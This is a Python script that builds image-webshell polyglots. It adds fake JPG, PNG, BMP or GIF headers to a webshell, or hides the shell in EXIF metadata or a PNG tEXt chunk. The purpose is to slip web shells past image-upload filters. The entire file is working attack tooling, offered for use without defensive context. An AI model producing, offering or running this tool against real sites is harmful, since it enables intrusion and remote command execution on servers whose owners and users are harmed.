#encoding:utf-8

import argparse
import os
import piexif
from PIL import Image
from struct import pack
from binascii import crc32

pictypes = {'jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00','png':b'\x89PNG\x0d\x0a\x1a\x0a','bmp':b'BM','gif':b'GIF89a'}

def usetype(pictype,webshell,saveshell):
    data = pictypes[pictype]
    data = data + webshell
    with open(saveshell,"wb") as f:
        f.write(data)
        print("saved in "+saveshell)

def usefile(pic,webshell,saveshell):
    with open(pic,"rb") as f:
        data = f.read()
    data = data + webshell
    with open(saveshell,"wb") as f:
        f.write(data)
        print("saved in "+saveshell)

def checkshell(webshell):
    if os.path.isfile(webshell):
        print("Webshell use file mode")
        with open(webshell,"rb") as f:
            data = f.read()
        return data
    else:
        print("Webshell use data mode")
        data = webshell.encode()
        return data

def useext(pic,webshell,saveshell):
    exif_formats = ["TIFF","JPEG","WEBP"]
    other_formats = ["PNG"]
    pic_image = Image.open(pic)
    if pic_image.format in exif_formats:
        save_in_exif(pic_image,webshell,saveshell)
        pic_image.close()
        return
    if pic_image.format in other_formats:
        if pic_image.format == "PNG":
            save_in_png(pic,webshell,saveshell)
            return
    print("--ext only support "+",".join(exif_formats+other_formats))
    

def save_in_exif(pic,webshell,saveshell):
    exif_dict = {}
    exif_dict['0th'] = {piexif.ImageIFD.Copyright:webshell}
    exif_bytes = piexif.dump(exif_dict)
    pic.save(saveshell,format = pic.format,exif=exif_bytes)
    print("saved in "+saveshell)

def save_in_png(pic,webshell,saveshell):
    with open(pic,"rb") as f:
        data = f.read()
    pre_data = data[0:33]
    end_data = data[33:]
    length = len(webshell) + 4 # 4 is the length of 'asd\x00'
    tEXt_data = b'tEXtasd\x00'+webshell
    crc = pack(">I",crc32(tEXt_data) & 0xffffffff)
    save_data = pre_data + pack(">I",length) + tEXt_data + crc + end_data
    with open(saveshell,"wb") as f:
        f.write(save_data)
        print("saved in "+saveshell)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--type",help="type of picture",choices=['jpg', 'png', 'bmp','gif'])
    parser.add_argument("-i","--image",help="filename of picture")
    parser.add_argument("-s","--shell",help="filename of webshell",required=True)
    parser.add_argument("-o","--output",help="filename of picshell",required=True)
    parser.add_argument("--ext",help="insert data into picture",action='store_true')
    args = parser.parse_args()
    if args.ext and args.image == None:
        print("Need set --ext and -i")
        exit()
    elif not args.ext and args.type == None and  args.image == None:
        print("Need set -t or -i")
        exit()
    if args.type != None:
        usetype(args.type,checkshell(args.shell),args.output)
    else:
        if args.ext:
            useext(args.image,checkshell(args.shell),args.output)
        else:
            usefile(args.image,checkshell(args.shell),args.output)

if __name__ == "__main__":
    main()